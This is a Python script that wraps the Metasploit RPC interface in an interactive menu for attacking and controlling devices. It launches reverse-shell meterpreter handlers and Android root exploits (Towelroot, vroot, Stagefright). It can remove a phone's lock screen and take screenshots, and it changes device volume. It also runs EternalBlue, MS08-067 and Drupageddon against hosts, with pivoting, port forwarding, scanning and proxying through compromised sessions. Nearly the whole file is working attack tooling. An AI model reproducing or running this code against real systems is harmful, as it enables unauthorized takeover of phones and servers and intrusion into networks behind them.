#!/usr/bin/python

import sys
import time
from metasploit.msfrpc import MsfRpcClient
import dsconfig as cfg
import os

lhost = cfg.lhost
mhost = cfg.mhost
mport = cfg.mport
rootport = cfg.rootport
msfpass = cfg.msfpass
winport = cfg.winport
drupalport = cfg.drupalport
rhost = cfg.rhost

error_msg = "Failed"
sess = ""
console_num = ""	

def menu1():
	
	print ""
	print '{0:35} {1:35} {2:35}'.format("1)  Work with Session/Console", "2)  List Session Numbers", "3)  List Jobs")
	print '{0:35} {1:35} {2:35}'.format("4)  Kill Job", "5)  Kill Session", "6)  List Consoles")
	print '{0:35} {1:35} {2:35}'.format("7)  Create Console", "8)  Read Console", "9)  Destroy Console")
	print '{0:35} {1:35} {2:35}'.format("10) Console Execute", "11) Control Androids", "12) Pivot")
	print ""
	
def menu2():
	
	print ""
	print '{0:25} {1:25} {2:25}'.format("1)  Execute Command", "2)  Read Shell", "3)  Help")
	print '{0:25} {1:25} {2:25}'.format("4)  Listen for Agent", "5)  Listen for Root", "6)  Vroot")
	print '{0:25} {1:25} {2:25}'.format("7)  Towelroot", "8)  Stagefright", "9)  Browsable Launcher")
	print '{0:25} {1:25} {2:25}'.format("10) Unlock (noroot) ", "11) Screencap (root)", "12) Change Volume")
	print ""

def menu3():

	print ""
	print '{0:25} {1:25} {2:25}'.format("1)  Route", "2)  Port Forward", "3)  TCP Scan")
	print '{0:25} {1:25} {2:25}'.format("4)  Syn Scan", "5)  Drupageddon", "6)  Eternalblue Scan")
	print '{0:25} {1:25} {2:25}'.format("7)  Listen for Drupal", "8)  Eternalblue", "9)  Proxy Chains")
	print '{0:25} {1:25} {2:25}'.format("10) Listen for Linux", "11)  ", "12) ")
	print ""

#start a meterpreter session on a port

def startsess( port ):

	client = MsfRpcClient(msfpass)
	exploit = client.modules.use('exploit', 'multi/handler')
	payload = client.modules.use('payload', 'android/meterpreter/reverse_tcp')
	payload['LHOST'] = mhost
	payload['LPORT'] = mport 
	exploit['ExitOnSession'] = True
	output = exploit.execute(payload=payload)
	return output;

#start a listener for drupal exploit

def startdrupal( port ):

	client = MsfRpcClient(msfpass)
	exploit = client.modules.use('exploit', 'multi/handler')
	payload = client.modules.use('payload', 'php/meterpreter/reverse_tcp')
	payload['LHOST'] = mhost
	payload['LPORT'] = port 
	exploit['ExitOnSession'] = True
	output = exploit.execute(payload=payload)
	return output;

def startlinux( port, host ):

	client = MsfRpcClient(msfpass)
	exploit = client.modules.use('exploit', 'multi/handler')
	payload = client.modules.use('payload', 'linux/x64/meterpreter/reverse_tcp')
	payload['LHOST'] = rhost
	payload['LPORT'] = drupalport 
	exploit['ExitOnSession'] = True
	output = exploit.execute(payload=payload)
	return output;

#list running jobs

def listjobs():
	client = MsfRpcClient(msfpass)
	jobs_list = client.jobs.list 
	for i in jobs_list:
		
		job_num = i
		job_desc = jobs_list[i]
		print '{0:10}\r\n{1:25}\r\n'.format("Job # : %s", "Job Description : %s") % (job_num, job_desc)

	return jobs_list;

#kill a selected job
def killjobs( sess ):

	client = MsfRpcClient(msfpass)
	client.jobs.stop(sess)

#get a count of sessions 

def numSessions():

	client = MsfRpcClient(msfpass)
	output = client.sessions.list
	num_sess = len(client.sessions.list)
	print "Number of Sessions: " + str(num_sess)

#Change volume of a device

def volume( sess ):

	client = MsfRpcClient(msfpass)
	shell = client.sessions.session(sess)
	level = raw_input("Pick Volume Level (0-2): ")

	if level == "0":

		shell.write('set_audio_mode -m 0\n')
		print shell.read() 

	elif level == "1":

		shell.write('set_audio_mode -m 1\n')
		print shell.read() 

	elif level == "2":

		shell.write('set_audio_mode -m 2\n')
		print shell.read() 

	else:

		exit()

#How many sessions are currently running

def sessions():

	client = MsfRpcClient(msfpass)
	output = client.sessions.list
	return output;

def print_sessions( sess_list ):

	for i in sess_list:
		
		print "Valid Session: " + str(i)

#Read shell output manually in case a command takes time to process

def readshell( sess ):

	client = MsfRpcClient(msfpass)
	shell = client.sessions.session(sess)
	print shell.read()

#Print help menu of meterpreter, requires a session

def readhelp( sess ):

	client = MsfRpcClient(msfpass)
	shell = client.sessions.session(sess)
	shell.write('help\n')
	print shell.read()

#Send exit to a shell, such as returning from android to meterpreter shell

def exitshell( sess, comm = "exit" ):

	client = MsfRpcClient(msfpass)
	shell = client.sessions.session(sess)
	command = comm + "\n"
	shell.write(command)


#Create a port forward

def portfwd( sess ):

        remote_ip= raw_input("Insert target IP: ")	
	local_port = raw_input("Insert listener port number: ")
	remote_port = raw_input("Insert target port number: ")
	type = raw_input("Pick forward type (explicitly state del to delete, add by default): ")

	if type == "del":

		pass				 

	else: 

		type = "add"

	command = "portfwd %s -L %s -l %s -p %s -r %s\n" % (type, lhost, local_port, remote_port, remote_ip)
	print command
	client = MsfRpcClient(msfpass)
	shell = client.sessions.session(sess)
	shell.write(command)
	time.sleep(5)
	print shell.read()

#Execute a command in a shell 

def execshell( sess, comm ):

	client = MsfRpcClient(msfpass)
	shell = client.sessions.session(sess)
	command = comm + "\n"
	shell.write(command)
	time.sleep(1)
	print ""
	print shell.read()

#not working

def screencap( sess ):

	client = MsfRpcClient(msfpass)
	post = client.modules.use('post', 'android/capture/screen')
	post['SESSION'] = sess
	post['TMP_PATH'] = '/data/data/com.metasploit.stage/files'
	post['EXE_PATH'] = '/system/bin/screenshot'
	output = post.execute()
	return output;

#Use root to unlock a device	

def unlock( sess ):

	client = MsfRpcClient(msfpass)
	shell = client.sessions.session(sess)
	post = client.modules.use('post', 'android/manage/remove_lock')
	post['SESSION'] = sess
	post.execute()

#Use root exploit to root device, start a listener after executing this

def rootit2( sess ):

	client = MsfRpcClient(msfpass)
	exploit = client.modules.use('exploit', 'android/local/futex_requeue')
	payload = client.modules.use('payload', 'linux/armle/meterpreter/reverse_tcp')
	payload['LHOST'] = rhost 
	client = MsfRpcClient(msfpass)
	payload['LPORT'] = rootport
	#Should be False by default, do it anyway
	exploit['DisablePayloadHandler'] = False 
	exploit['SESSION'] = sess 
	#For old samsung, new = 2, grand = 4
	#exploit['target'] = 3 
	output = exploit.execute(payload=payload, target=3)
	return output;  

def rootit( sess ):

	client = MsfRpcClient(msfpass)
	exploit = client.modules.use('exploit', 'android/local/put_user_vroot')
	payload = client.modules.use('payload', 'linux/armle/meterpreter/reverse_tcp')
	payload['LHOST'] = rhost 
	client = MsfRpcClient(msfpass)
	payload['LPORT'] = rootport
	#Should be False by default, do it anyway
	exploit['DisablePayloadHandler'] = False 
	exploit['SESSION'] = sess 
	output = exploit.execute(payload=payload)
	return output;  

#Start a root listener, there should be no other listeners when running the exploit    

def startroot( port ):

	client = MsfRpcClient(msfpass)
	exploit = client.modules.use('exploit', 'multi/handler')
	payload = client.modules.use('payload', 'linux/armle/meterpreter/reverse_tcp')
	payload['LHOST'] = mhost
	payload['LPORT'] = rootport 
	output = exploit.execute(payload=payload)
	print output
	return output;

#Use eternal blue exploit against portforwarded target
def eternalblue_scan( addr, threads, chk_dopu, console_num, port):

	client = MsfRpcClient(msfpass)
	exploit = """use auxiliary/scanner/smb/smb_ms17_010\r\n set RHOSTS %s\r\n set THREADS %s\r\n set CHECK_DOPU %s\r\n set RPORT %s\r\nrun""" % ( addr, threads, chk_dopu, port )
	write_console( console_num, exploit )
	
def eternalblue(host, allocations, delta, attempts, console_num, port, lport ):

	client = MsfRpcClient(msfpass)
	#exploit = """use exploit/windows/smb/ms17_010_eternalblue\r\n set RHOST %s\r\n set GroomAllocations %s\r\n set GroomDelta %s\r\n set MaxExploitAttempts %s\r\n set payload windows/x64/meterpreter/reverse_tcp\r\n set LHOST %s\r\n set RPORT %s\r\n set LPORT %s\r\n run""" % ( addr, allocations, delta, attempts, mhost, port, lport)
#	write_console( console_num, exploit )
	exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
	payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
	payload['LHOST'] = rhost 
	payload['LPORT'] = winport
	exploit['RHOST'] = host 
	exploit['RPORT'] = port
	exploit['GroomAllocations'] = allocations 
	exploit['GroomDelta'] = delta
	exploit['VerifyArch'] = False
	exploit['VerifyTarget'] = False
	exploit['MaxExploitAttempts'] = attempts
	output = exploit.execute(payload=payload)
	return output;  

#Use ms08067 exploit against portforwarded target    

def ms08067( sess ):

	client = MsfRpcClient(msfpass)
	exploit = client.modules.use('exploit', 'windows/smb/ms08_067_netapi')
	payload = client.modules.use('payload', 'windows/shell_reverse_tcp')
	payload['LHOST'] = mhost 
	client = MsfRpcClient(msfpass)
	payload['LPORT'] = winport
	#Should be False by default, do it anyway
	#exploit['DisablePayloadHandler'] = False 
	exploit['RHOST'] = lhost 
	output = exploit.execute(payload=payload)
	return output;  

#Use drupal exploit against port forwarded target

def drupageddon( remport, remhost ):
	client = MsfRpcClient(msfpass)
	exploit = client.modules.use('exploit', 'multi/http/drupal_drupageddon')
	payload = client.modules.use('payload', 'php/meterpreter/reverse_tcp')
	payload['LHOST'] = mhost 
	client = MsfRpcClient(msfpass)
	payload['LPORT'] = drupalport
	#Should be False by default, do it anyway
 	exploit['RHOST'] = remhost 
 	exploit['RPORT'] = remport
	output = exploit.execute(payload=payload)
	return output;  

def post_route( sess, network, netmask, cmd ):

	client = MsfRpcClient(msfpass)	
	exploit = client.modules.use('post', 'multi/manage/autoroute')
	exploit['CMD'] = cmd
	exploit['NETMASK'] = netmask
	exploit['SESSION'] = sess
	exploit['SUBNET'] = network
	output = exploit.execute()
	return output;

def port_scan( port, addr, console_num, timeout = 5000, delay = 0, threads = 1 ):

	client = MsfRpcClient(msfpass)
	exploit = """use auxiliary/scanner/portscan/tcp\r\n set RHOSTS %s\r\n set PORTS %s\r\n set TIMEOUT %s\r\n set DELAY %s\r\n set THREADS %s\r\nrun""" % ( addr, port, timeout, delay, threads )
	write_console( console_num, exploit )

def port_scan_syn( port, addr, console_num ):

	client = MsfRpcClient(msfpass)
	exploit = """use auxiliary/scanner/portscan/syn\r\n set RHOSTS %s\r\n set PORTS %s\r\n set TIMEOUT 5000\r\nrun""" % ( addr, port )
	write_console( console_num, exploit )

def stage_fright( port, path ):

	client = MsfRpcClient(msfpass)
	exploit = client.modules.use('exploit', 'android/browser/stagefright_mp4_tx3g_64bit')
	payload = client.modules.use('payload', 'linux/armle/meterpreter/reverse_tcp')
	#Since stagefright and root cannot resolve names, use ipv4 address
	payload['LHOST'] = rhost 
	payload['LPORT'] = rootport
	exploit['SRVPORT'] = port 
	exploit['URIPATH'] = path	
	output = exploit.execute(payload=payload)
	return output;

def browsable_msf( port, path ):

	client = MsfRpcClient(msfpass)
#sample command run in console
#	exploit = """use auxiliary/server/android_browsable_msf_launch\r\n set SRVPORT %s\r\n set URIPATH %s\r\nrun""" % ( port, path )
	#write_console( console_num, exploit )
        #time.sleep(2)
        #read_console( console_num )
	exploit = client.modules.use('auxiliary', 'server/android_browsable_msf_launch')
	exploit['SRVPORT'] = port 
	exploit['URIPATH'] = path	
	output = exploit.execute()
	return output;
	
def proxy_chains():
	
	client = MsfRpcClient(msfpass)
	exploit = client.modules.use('auxiliary', 'server/socks4a')
	output = exploit.execute()
	return output;	
	
def list_consoles():

	client = MsfRpcClient(msfpass)
	console_dict = client.consoles.list
	console_list = []
	for i in console_dict['consoles']:

		id = i['id']
		console_list.append(id)

	return console_list, console_dict;

def print_console( console_dict ):

	for i in console_dict['consoles']:

		busy = i['busy']
		prompt = i['prompt']
		new_p = ""
		for x in prompt:

			ord_num = ord(x)

			if ord_num < 31 or ord_num > 126:

				new_p = new_p + ""		

			else:

				new_p = new_p + x

		id = i['id']

		print '{0:10}\r\n{1:10}\r\n{2:50}\r\n'.format("ID : %s", "Busy : %s", "Prompt : %s") % (id, busy, new_p)


def read_console( console_num ):

	client = MsfRpcClient(msfpass)
	output = client.call('console.read', console_num)
	
	try:

		if output['data'] == "":

			print "\r\nNothing in register"

		else:

			print "\r\n" + output['data']

	except:

		print "\r\nNo console selected"

def create_console():

	client = MsfRpcClient(msfpass)
	output = client.call('console.create')
	new_p = ""
	busy = output['busy']

	prompt = output['prompt']
	for x in prompt:

		ord_num = ord(x)

		if ord_num < 31 or ord_num > 126:

			new_p = new_p + ""		

		else:

			new_p = new_p + x

	id = output['id']
	print '{0:10}\r\n{1:10}\r\n{2:50}\r\n'.format("ID : %s", "Busy : %s", "Prompt : %s") % (id, busy, new_p)

def write_console( console_num, cmd ):

	client = MsfRpcClient(msfpass)
	cmd = cmd + "\r\n"
	output = client.call('console.write', console_num, cmd)
        time.sleep(1)
        read_console( console_num )

def destroy_console( console_num ):

	client = MsfRpcClient(msfpass)
	client.consoles.destroy(console_num)

#New Menu

os.system("/usr/bin/clear")


try:
	while True:
	
		valid_s = sessions()

		if len(valid_s) >= 1 and sess == "":
    
			for i in valid_s:

				sess = i
		else:

			sess = sess 

		valid_c = list_consoles()

		if len(valid_c[0]) >= 1 and console_num == "":

			for i in valid_c[0]:

				console_num = i

		else:

			console_num = console_num

		print '{0:35} {1:35} {2:35}'.format("\r\nConsole: %s", "Session: %s", "") % ( console_num, sess )
		menu1()

		print ""
		text = raw_input("Pick an option: ")
		print ""

		if text == "1":

			try:
				sc_list = ["s","c"]
				sc_choice = ""

				while sc_choice not in sc_list:

					sc_choice = raw_input("Work with consoles or sessions? (c/s): ")

				if sc_choice[0] == "s":
						
					valid_s = sessions()
					if len(valid_s) > 0:

						sess = ""
						while sess not in valid_s:

							valid_s = sessions()
							print ""
							print_sessions(valid_s)
							print ""
							sess = raw_input("Please enter valid session #: ")
							sess = int(sess)

					else:

						print "No sessions"

				elif sc_choice[0] == "c":

					valid_c = list_consoles()

					if len(valid_c[0]) > 0:

						console_num = ""

						while console_num not in valid_c[0]:

							c_string = "Valid Consoles Choices: "
							valid_c = list_consoles()

							for c_num in valid_c[0]:

								c_string = c_string + c_num + ":"	

							c_string = c_string.rstrip(":")
							print "\r\n" + c_string + "\r\n"
							console_num = raw_input("Please enter valid console #: ")
							print ""

					else:

						print "No consoles"

				else:
				
					print "invalid selection"

			except:

				print error_msg 

		elif text == "2":

			try:

		        	s_list_2 = sessions()
				print_sessions(s_list_2)
	
			except:

				print error_msg

		elif text == "3":

			try:

       			 	listjobs()
	
			except:

				print "Could not list jobs"

		elif text == "4":

			try:

				job_num = ""
				valid_j = listjobs()
				job_list = []

				if len(valid_j) < 1:

					print "No jobs to kill"

				else:

					for i in valid_j:

						job_list.append(i)
	
					while job_num not in job_list:

        					job_num = raw_input("Insert valid job number: ")

					killjobs( job_num )

			except:

				print "Could not kill job"

		elif text == "5":

			try:

				valid_s = sessions()

				if len(valid_s) > 0:

					while sess not in valid_s:

						sess = raw_input("Please enter valid session #: ")

					exitshell( sess ) 
					sess = ""
	
			except:

				print "Could not exit session"

		elif text == "6":

			try:

				valid_c = list_consoles()
				print_console( valid_c[1] )

			except:

				print "Could not print console data"

		elif text == "7":

			try:

				create_console()
	
			except:

				print "Could not create console"

		elif text == "8":

			try:

				read_console( console_num )
	
			except:

				print "Could not read from console"

		elif text == "9":

			try:

				destroy_console( console_num )
				console_num = ""
	
			except:

				print "Could not destroy console"

		elif text == "10":

			try:

				command = raw_input("Please enter a command to run: ")
				write_console( console_num, command )
	
			except:

				print "Could not execute within console"

		elif text == "11":

			while True:

				menu2()

				print ""
				text = raw_input("Pick an option: ")
				print ""

				if text == "1":

					try:

       			 			command = raw_input("Command: ")
						execshell( sess, command  ) 

					except:

						print error_msg 

    				elif text == "2":

					try:

						readshell( sess )
	
					except:

						print error_msg 

    				elif text == "3":

					try:

						readhelp( sess ) 

					except:

						print error_msg 

				elif text == "4":

					#try:

				        	startsess( mport) 
			
				#	except:

				#		print error_msg

    				elif text == "5":

					try:

       		 				startroot( rootport )
			
					except:

						print error_msg

				elif text == "6":

					try:

				       		 rootit( sess )

					except:

						print error_msg

				elif text == "7":

					try:

						rootit2( sess )

					except:

						print error_msg

				elif text == "8":

					try:

						port = raw_input("Stagefright port: ")
						path = raw_input("Stagefright path: ")
						stage_fright( port, path )

					except:

						print "Couldn't start stagefright."

				elif text == "9":

					try:

						port = raw_input("Launcher port: ")
						path = raw_input("Launcher path: ")
						browsable_msf( port, path )

					except:	
					
						print "Couldn't start launcher"

				elif text == "10":

					try:

						unlock( session )
	
					except:

						print error_msg

				elif text == "11":


					try:

						screencap( sess )
	
					except:

						print error_msg
			
				elif text == "12":


					try:

						volume( sess )
			
					except:

						print error_msg 

    				else:

					break

		elif text == "12":

			while True:
			
				menu3()

				text = raw_input("Pick an option: ")

				if text == "1":

					try:

						network = raw_input("Network: ")
						netmask = raw_input("Netmask/CIDR: ")
						cmd = raw_input("CMD: add, autoadd, print, delete, default: ")
						post_route( sess, network, netmask, cmd )

					except:

						print "Failed to route."

    				elif text == "2":


					try:

						portfwd( sess )

					except:

						print error_msg

				elif text == "3":

					try:
				
						port = raw_input("Port(s): ")
						addr = raw_input("Address(es): ")
						timeout = raw_input("Timeout: ")
						delay = raw_input("Delay: ")
						threads = raw_input("Thread(s): ")
						port_scan( port, str(addr), console_num, timeout, delay, threads )
						print ""

					except:

						print "Failed to start portscan."	

				elif text == "4":

					try:
				
						port = raw_input("Port(s): ")
						addr = raw_input("Address(es): ")
						port_scan_syn( port, str(addr), console_num )
						print ""

					except:

						print "Failed to start portscan."	

    				elif text == "5":

					try:

						remote_port = raw_input("Insert target port number: ")
						remote_host = raw_input("Insert host: ")
						drupageddon( remote_port, remote_host )

					except:

						print error_msg

    				elif text == "6":

					try:

						dopu = ""
						addr = raw_input("Address(es): ")
						threads = raw_input("Thread(s): ")

						while dopu not in ("true", "false"):

							dopu = raw_input("Check DOPU (true/false): ")

						et_port = raw_input("Port(s): ")
						eternalblue_scan( addr, threads, dopu, console_num, et_port)

					except:

						print error_msg

				elif text == "7":

					try:

			 	 	      	startdrupal( drupalport ) 
			
					except:

						print error_msg

				elif text == "8":

					try:
	
						addr = raw_input("Address(es): ")
						groomallocations = raw_input("Allocation(s) (12): ")
						groomdelta = raw_input("Delta(s) (5): ")
						maxattempts = raw_input("Max Exploit Attempt(s): ")
						et_port = raw_input("Port: ")
						eternalblue( addr, int(groomallocations), int(groomdelta), int(maxattempts), console_num, et_port, winport)

					except:

						print  error_msg

				elif text == "9":

					try:

						proxy_chains()

					except:

						print "Could not start Proxy Chains."

				elif text == "10":

					try:

						addr = raw_input("Address: ")
						port = raw_input("Port: ")
			        		startlinux( port, addr ) 

					except:

						print error_msg

    				else:

					break

		else:

			break

except:

	print error_msg
